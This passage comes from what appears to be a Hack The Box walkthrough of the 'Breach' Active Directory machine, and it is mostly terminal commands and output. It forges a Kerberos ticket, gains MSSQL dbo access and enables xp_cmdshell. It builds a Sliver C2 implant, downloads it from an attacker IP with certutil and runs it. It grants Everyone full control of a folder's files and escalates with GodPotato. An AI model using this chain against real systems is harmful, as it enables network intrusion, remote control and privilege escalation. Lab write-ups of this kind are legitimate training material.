<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>basic<span class="w"> </span>skeleton<span class="w"> </span>ticket<span class="w"> </span>and<span class="w"> </span>PAC<span class="w"> </span>Infos
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Customizing<span class="w"> </span>ticket<span class="w"> </span><span class="k">for</span><span class="w"> </span>breach.vl/christine.bruce
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_LOGON_INFO
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_CLIENT_INFO_TYPE
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTicketPart
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTGSRepPart
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Signing/Encrypting<span class="w"> </span>final<span class="w"> </span>ticket
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_SERVER_CHECKSUM
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>PAC_PRIVSVR_CHECKSUM
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTicketPart
<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>EncTGSRepPart
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>christine.bruce.ccache
</code></pre></div>
<p>My access when connecting to the <code>mssql</code> instance with these credentials is <code>dbo</code></p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/christine.bruce.ccache<span class="w"> </span>impacket-mssqlclient<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>breach.vl/christine.bruce@breachdc.breach.vl
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>required,<span class="w"> </span>switching<span class="w"> </span>to<span class="w"> </span>TLS
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>master,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>master
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>us_english
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span><span class="m">16192</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>database<span class="w"> </span>context<span class="w"> </span>to<span class="w"> </span><span class="s1">'master'</span>.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>language<span class="w"> </span>setting<span class="w"> </span>to<span class="w"> </span>us_english.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ACK:<span class="w"> </span>Result:<span class="w"> </span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="o">(</span><span class="m">150</span><span class="w"> </span><span class="m">7208</span><span class="o">)</span><span class="w"> </span>
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
SQL<span class="w"> </span><span class="o">(</span>BREACH<span class="se">\A</span>dministrator<span class="w">  </span>dbo@master<span class="o">)</span>&gt;
</code></pre></div>
<p>Enable <code>xp_cmdshell</code></p>
<div class="highlight"><pre><span></span><code>SQL<span class="w"> </span><span class="o">(</span>BREACH<span class="se">\A</span>dministrator<span class="w">  </span>dbo@master<span class="o">)</span>&gt;<span class="w"> </span>enable_xp_cmdshell
INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">185</span>:<span class="w"> </span>Configuration<span class="w"> </span>option<span class="w"> </span><span class="s1">'show advanced options'</span><span class="w"> </span>changed<span class="w"> </span>from<span class="w"> </span><span class="m">0</span><span class="w"> </span>to<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>Run<span class="w"> </span>the<span class="w"> </span>RECONFIGURE<span class="w"> </span>statement<span class="w"> </span>to<span class="w"> </span>install.
INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">185</span>:<span class="w"> </span>Configuration<span class="w"> </span>option<span class="w"> </span><span class="s1">'xp_cmdshell'</span><span class="w"> </span>changed<span class="w"> </span>from<span class="w"> </span><span class="m">0</span><span class="w"> </span>to<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>Run<span class="w"> </span>the<span class="w"> </span>RECONFIGURE<span class="w"> </span>statement<span class="w"> </span>to<span class="w"> </span>install.
</code></pre></div>
<p>Start <code>sliver-server</code>, enabling <code>multiplayer</code>, also stand up an <code>mtls listener</code> on <code>8443</code> with a <code>timeout</code> of <code>240</code>.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>sliver-server
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Loaded<span class="w"> </span><span class="m">23</span><span class="w"> </span>aliases<span class="w"> </span>from<span class="w"> </span>disk
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Loaded<span class="w"> </span><span class="m">151</span><span class="w"> </span>extension<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>from<span class="w"> </span>disk

<span class="w">    </span>███████╗██╗<span class="w">     </span>██╗██╗<span class="w">   </span>██╗███████╗██████╗
<span class="w">    </span>██╔════╝██║<span class="w">     </span>██║██║<span class="w">   </span>██║██╔════╝██╔══██╗
<span class="w">    </span>███████╗██║<span class="w">     </span>██║██║<span class="w">   </span>██║█████╗<span class="w">  </span>██████╔╝
<span class="w">    </span>╚════██║██║<span class="w">     </span>██║╚██╗<span class="w"> </span>██╔╝██╔══╝<span class="w">  </span>██╔══██╗
<span class="w">    </span>███████║███████╗██║<span class="w"> </span>╚████╔╝<span class="w"> </span>███████╗██║<span class="w">  </span>██║
<span class="w">    </span>╚══════╝╚══════╝╚═╝<span class="w">  </span>╚═══╝<span class="w">  </span>╚══════╝╚═╝<span class="w">  </span>╚═╝

All<span class="w"> </span>hackers<span class="w"> </span>gain<span class="w"> </span>annihilator
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span>v1.5.43<span class="w"> </span>-<span class="w"> </span>e116a5ec3d26e8582348a29cfd251f915ce4a405
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Welcome<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>sliver<span class="w"> </span>shell,<span class="w"> </span>please<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s1">'help'</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>options

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Check<span class="w"> </span><span class="k">for</span><span class="w"> </span>updates<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span><span class="s1">'update'</span><span class="w"> </span><span class="nb">command</span>

<span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;<span class="w"> </span>multiplayer<span class="w"> </span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Multiplayer<span class="w"> </span>mode<span class="w"> </span>enabled!

<span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;<span class="w"> </span>mtls<span class="w"> </span>-t<span class="w"> </span><span class="m">240</span><span class="w"> </span>--lport<span class="w"> </span><span class="m">8443</span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>mTLS<span class="w"> </span>listener<span class="w"> </span>...

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>started<span class="w"> </span>job<span class="w"> </span><span class="c1">#3</span>

<span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;
</code></pre></div>
<p>Generate a new operator profile</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>server<span class="o">]</span><span class="w"> </span>sliver<span class="w"> </span>&gt;<span class="w"> </span>new-operator<span class="w"> </span>--lhost<span class="w"> </span><span class="m">10</span>.10.14.204<span class="w"> </span>--save<span class="w"> </span>duff<span class="w"> </span>--name<span class="w"> </span>duff

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>new<span class="w"> </span>client<span class="w"> </span>certificate,<span class="w"> </span>please<span class="w"> </span><span class="nb">wait</span><span class="w"> </span>...<span class="w"> </span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>new<span class="w"> </span>client<span class="w"> </span>config<span class="w"> </span>to:<span class="w"> </span>/home/notroot/htb/machines/breach/duff<span class="w"> </span>
</code></pre></div>
<p>In another shell, import the profile into <code>sliver-client</code>.  Connect.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>sliver-client<span class="w"> </span>import<span class="w"> </span>duff
<span class="m">2025</span>/10/25<span class="w"> </span><span class="m">03</span>:26:23<span class="w"> </span>Saved<span class="w"> </span>new<span class="w"> </span>client<span class="w"> </span>config<span class="w"> </span>to:<span class="w"> </span>/home/notroot/.sliver-client/configs/duff_10.10.14.204.cfg

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>sliver-client
?<span class="w"> </span>Select<span class="w"> </span>a<span class="w"> </span>server:<span class="w"> </span>duff@10.10.14.204<span class="w"> </span><span class="o">(</span>a0e0ed1e78716827<span class="o">)</span>
Connecting<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.10.14.204:31337<span class="w"> </span>...
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Loaded<span class="w"> </span><span class="m">23</span><span class="w"> </span>aliases<span class="w"> </span>from<span class="w"> </span>disk
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Loaded<span class="w"> </span><span class="m">151</span><span class="w"> </span>extension<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>from<span class="w"> </span>disk

.------..------..------..------..------..------.
<span class="p">|</span>S.--.<span class="w"> </span><span class="o">||</span>L.--.<span class="w"> </span><span class="o">||</span>I.--.<span class="w"> </span><span class="o">||</span>V.--.<span class="w"> </span><span class="o">||</span>E.--.<span class="w"> </span><span class="o">||</span>R.--.<span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>:/<span class="se">\:</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>:/<span class="se">\:</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span><span class="se">\/</span><span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>:<span class="o">()</span>:<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span><span class="se">\/</span><span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>:<span class="o">()</span>:<span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span>:<span class="se">\/</span>:<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>__<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>:<span class="se">\/</span>:<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">()()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>:<span class="se">\/</span>:<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">()()</span><span class="w"> </span><span class="p">|</span>
<span class="p">|</span><span class="w"> </span><span class="s1">'--'</span>S<span class="o">||</span><span class="w"> </span><span class="s1">'--'</span>L<span class="o">||</span><span class="w"> </span><span class="s1">'--'</span>I<span class="o">||</span><span class="w"> </span><span class="s1">'--'</span>V<span class="o">||</span><span class="w"> </span><span class="s1">'--'</span>E<span class="o">||</span><span class="w"> </span><span class="s1">'--'</span>R<span class="p">|</span>
<span class="sb">`</span>------<span class="s1">'`------'</span><span class="sb">`</span>------<span class="s1">'`------'</span><span class="sb">`</span>------<span class="s1">'`------'</span>

All<span class="w"> </span>hackers<span class="w"> </span>gain<span class="w"> </span>assist
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span>v1.5.43<span class="w"> </span>-<span class="w"> </span>e116a5ec3d26e8582348a29cfd251f915ce4a405
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Welcome<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>sliver<span class="w"> </span>shell,<span class="w"> </span>please<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s1">'help'</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>options

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Check<span class="w"> </span><span class="k">for</span><span class="w"> </span>updates<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span><span class="s1">'update'</span><span class="w"> </span><span class="nb">command</span>

sliver<span class="w"> </span>&gt;
</code></pre></div>
<p>Generate an implant</p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span>&gt;<span class="w"> </span>generate<span class="w"> </span>-l<span class="w"> </span>-G<span class="w"> </span>-t<span class="w"> </span><span class="m">240</span><span class="w"> </span>-m<span class="w"> </span><span class="m">10</span>.10.14.204:8443<span class="w"> </span>-a<span class="w"> </span>amd64<span class="w"> </span>-o<span class="w"> </span>windows<span class="w"> </span>-j<span class="w"> </span><span class="m">60</span><span class="w"> </span>-s<span class="w"> </span>a.exe

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Generating<span class="w"> </span>new<span class="w"> </span>windows/amd64<span class="w"> </span>implant<span class="w"> </span>binary
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Symbol<span class="w"> </span>obfuscation<span class="w"> </span>is<span class="w"> </span>disabled
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Build<span class="w"> </span>completed<span class="w"> </span><span class="k">in</span><span class="w"> </span>2s
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Implant<span class="w"> </span>saved<span class="w"> </span>to<span class="w"> </span>/home/notroot/htb/machines/breach/a.exe
</code></pre></div>
<p>Serve it</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">443</span>
Serving<span class="w"> </span>HTTP<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>port<span class="w"> </span><span class="m">8443</span><span class="w"> </span><span class="o">(</span>http://0.0.0.0:8443/<span class="o">)</span><span class="w"> </span>...
</code></pre></div>
<p>On the <code>mssqlclient</code>, use <code>xp_cmdshell</code> to download the implant to the host</p>
<div class="highlight"><pre><span></span><code>SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c certutil -urlcache -split -f http://10.10.14.204:443/a.exe  \windows\tasks\a.exe
output                                                
---------------------------------------------------   
****  Online  ****                                    

  000000  ...                                         

  988a00                                              

CertUtil: -URLCache command completed successfully.   

NULL 
</code></pre></div>
<p>Invoke the implant</p>
<div class="highlight"><pre><span></span><code>SQL<span class="w"> </span><span class="o">(</span>BREACH<span class="se">\A</span>dministrator<span class="w">  </span>dbo@master<span class="o">)</span>&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\a</span>.exe
</code></pre></div>
<p>The user context is high integrity, with <code>SeImpersonatePrivilege</code>.</p>
<div class="highlight"><pre><span></span><code>PS<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span>whoami<span class="w"> </span>/groups
whoami<span class="w"> </span>/groups

GROUP<span class="w"> </span>INFORMATION
-----------------

Group<span class="w"> </span>Name<span class="w">                                 </span>Type<span class="w">             </span>SID<span class="w">                                                             </span><span class="nv">Attributes</span><span class="w">                                        </span>
<span class="o">==========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">===============================================================</span><span class="w"> </span><span class="o">==================================================</span>
Everyone<span class="w">                                   </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-1-0<span class="w">                                                         </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
BUILTIN<span class="se">\U</span>sers<span class="w">                              </span>Alias<span class="w">            </span>S-1-5-32-545<span class="w">                                                    </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
BUILTIN<span class="se">\P</span>re-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w"> </span>Alias<span class="w">            </span>S-1-5-32-554<span class="w">                                                    </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>ERVICE<span class="w">                       </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-6<span class="w">                                                         </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
CONSOLE<span class="w"> </span>LOGON<span class="w">                              </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-2-1<span class="w">                                                         </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
NT<span class="w"> </span>AUTHORITY<span class="se">\A</span>uthenticated<span class="w"> </span>Users<span class="w">           </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-11<span class="w">                                                        </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
NT<span class="w"> </span>AUTHORITY<span class="se">\T</span>his<span class="w"> </span>Organization<span class="w">             </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-15<span class="w">                                                        </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
NT<span class="w"> </span>SERVICE<span class="se">\M</span>SSQL<span class="nv">$SQLEXPRESS</span><span class="w">                </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group,<span class="w"> </span>Group<span class="w"> </span>owner<span class="w">    </span>
LOCAL<span class="w">                                      </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-2-0<span class="w">                                                         </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
Authentication<span class="w"> </span>authority<span class="w"> </span>asserted<span class="w"> </span>identity<span class="w"> </span>Well-known<span class="w"> </span>group<span class="w"> </span>S-1-18-1<span class="w">                                                        </span>Mandatory<span class="w"> </span>group,<span class="w"> </span>Enabled<span class="w"> </span>by<span class="w"> </span>default,<span class="w"> </span>Enabled<span class="w"> </span>group
Mandatory<span class="w"> </span>Label<span class="se">\H</span>igh<span class="w"> </span>Mandatory<span class="w"> </span>Level<span class="w">       </span>Label<span class="w">            </span>S-1-16-12288<span class="w">                                                                                                      </span>
PS<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span>whoami<span class="w"> </span>/priv
whoami<span class="w"> </span>/priv

PRIVILEGES<span class="w"> </span>INFORMATION
----------------------

Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                               </span><span class="nv">State</span><span class="w">   </span>
<span class="o">=============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span>
SeAssignPrimaryTokenPrivilege<span class="w"> </span>Replace<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>level<span class="w"> </span>token<span class="w">             </span>Disabled
SeIncreaseQuotaPrivilege<span class="w">      </span>Adjust<span class="w"> </span>memory<span class="w"> </span>quotas<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>process<span class="w">        </span>Disabled
SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">                </span>Disabled
SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">                  </span>Enabled<span class="w"> </span>
SeManageVolumePrivilege<span class="w">       </span>Perform<span class="w"> </span>volume<span class="w"> </span>maintenance<span class="w"> </span>tasks<span class="w">          </span>Enabled<span class="w"> </span>
SeImpersonatePrivilege<span class="w">        </span>Impersonate<span class="w"> </span>a<span class="w"> </span>client<span class="w"> </span>after<span class="w"> </span>authentication<span class="w"> </span>Enabled<span class="w"> </span>
SeCreateGlobalPrivilege<span class="w">       </span>Create<span class="w"> </span>global<span class="w"> </span>objects<span class="w">                     </span>Enabled<span class="w"> </span>
SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">            </span>Disabled
PS<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span>whoami<span class="w"> </span>/user
whoami<span class="w"> </span>/user

USER<span class="w"> </span>INFORMATION
----------------

User<span class="w"> </span>Name<span class="w">        </span><span class="nv">SID</span><span class="w">                                          </span>
<span class="o">================</span><span class="w"> </span><span class="o">=============================================</span>
breach<span class="se">\s</span>vc_mssql<span class="w"> </span>S-1-5-21-2330692793-3312915120-706255856-1115
</code></pre></div>
<h2 id="escalate">Escalate<a class="headerlink" href="#escalate" title="Permanent link">¶</a></h2>
<p>Upload <code>GodPotato.exe</code></p>
<div class="highlight"><pre><span></span><code>sliver<span class="w"> </span><span class="o">(</span>COLOURFUL_GUILTY<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>/var/www/html/GodPotato-NET4.exe<span class="w"> </span>/windows/tasks/godpotato.exe

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Wrote<span class="w"> </span>file<span class="w"> </span>to<span class="w"> </span>C:<span class="se">\w</span>indows<span class="se">\t</span>asks<span class="se">\g</span>odpotato.exe
</code></pre></div>
<p>Loosen DACLs around the implant (so that other users, like NT AUTHORITY\System can read/execute).  This is needed because files written here are by default only permitted read/exec by the user who wrote them, even administrators and SYSTEM are denied by default.</p>
<div class="highlight"><pre><span></span><code><span class="nv">$path</span><span class="o">=</span><span class="s2">"c:\windows\tasks"</span><span class="p">;</span><span class="w"> </span><span class="o">(</span>Get-ChildItem<span class="w"> </span>-path<span class="w"> </span><span class="nv">$path</span><span class="se">\*</span><span class="w"> </span>-Recurse<span class="o">)</span>.FullName<span class="w"> </span><span class="p">|</span><span class="w"> </span>%<span class="w"> </span><span class="o">{</span><span class="nv">$Acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Get-ACL<span class="w"> </span><span class="nv">$_</span><span class="p">;</span><span class="w"> </span><span class="nv">$AccessRule</span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Security.AccessControl.FileSystemAccessRule<span class="o">(</span><span class="s2">"Everyone"</span>,<span class="s2">"FullControl"</span>,<span class="s2">"none"</span>,<span class="s2">"none"</span>,<span class="s2">"Allow"</span><span class="o">)</span><span class="p">;</span><span class="nv">$Acl</span>.AddAccessRule<span class="o">(</span><span class="nv">$AccessRule</span><span class="o">)</span><span class="p">;</span>Set-Acl<span class="w"> </span><span class="nv">$_</span><span class="w"> </span><span class="nv">$Acl</span><span class="o">}</span>
</code></pre></div>
<p><code>Godpotato</code> for escalation</p>
<div class="highlight"><pre><span></span><code>PS<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks
<span class="nb">cd</span><span class="w"> </span><span class="se">\w</span>indows<span class="se">\t</span>asks
PS<span class="w"> </span>C:<span class="se">\w</span>indows<span class="se">\t</span>asks&gt;<span class="w"> </span>.<span class="se">\g</span>odpotato.exe<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"cmd.exe /c .\a.exe"</span>
.<span class="se">\g</span>odpotato.exe<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"cmd.exe /c .\a.exe"</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CombaseModule:<span class="w"> </span>0x140732047294464
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DispatchTable:<span class="w"> </span>0x140732049885048
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UseProtseqFunction:<span class="w"> </span>0x140732049177392
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UseProtseqFunctionParamCount:<span class="w"> </span><span class="m">6</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>HookRPC
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Start<span class="w"> </span>PipeServer
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CreateNamedPipe<span class="w"> </span><span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\0</span>1d890f9-0469-4a71-8628-fee24a4b0d37<span class="se">\p</span>ipe<span class="se">\e</span>pmapper
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trigger<span class="w"> </span>RPCSS
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>GUID:<span class="w"> </span><span class="m">00000000</span>-0000-0000-c000-000000000046
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>IPID:<span class="w"> </span><span class="m">00005802</span>-03c8-ffff-60ec-ae3827a25927
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>OXID:<span class="w"> </span>0x6a8455b40cabdba3
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>OID:<span class="w"> </span>0xa9eaaee4bb2b2694
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>Flags:<span class="w"> </span>0x281
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>DCOM<span class="w"> </span>obj<span class="w"> </span>PublicRefs:<span class="w"> </span>0x0
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Marshal<span class="w"> </span>Object<span class="w"> </span>bytes<span class="w"> </span>len:<span class="w"> </span><span class="m">100</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>UnMarshal<span class="w"> </span>Object
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Pipe<span class="w"> </span>Connected!
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CurrentUser:<span class="w"> </span>NT<span class="w"> </span>AUTHORITY<span class="se">\N</span>ETWORK<span class="w"> </span>SERVICE
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>CurrentsImpersonationLevel:<span class="w"> </span>Impersonation
